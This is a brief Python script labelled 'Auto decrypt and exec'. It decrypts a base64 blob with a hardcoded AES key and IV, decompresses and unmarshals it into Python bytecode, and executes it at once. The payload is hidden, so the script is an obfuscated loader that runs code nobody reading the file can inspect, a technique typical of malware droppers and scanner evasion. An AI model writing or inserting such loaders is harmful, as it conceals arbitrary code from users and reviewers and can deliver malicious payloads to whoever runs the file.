# Auto decrypt and exec
import base64
import marshal
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

KEY = b'thisis16bytekey!'
IV = b'16byteinitvector'
encoded = "j9o5GvSSIpk1eUBmXbZzO77tgAazWr9b4hFQx+tZ4XiCtJpc+s2a7HYHPY4rkefL9lG+abX3YGUMapPwA+9S4SpSHRENdBSiZ6VH/5w2rHnMxU1ujGgPBDC5oM1klZhs"

cipher = AES.new(KEY, AES.MODE_CBC, IV)
decrypted = unpad(cipher.decrypt(base64.b64decode(encoded)), AES.block_size)
code = marshal.loads(zlib.decompress(decrypted))
exec(code)
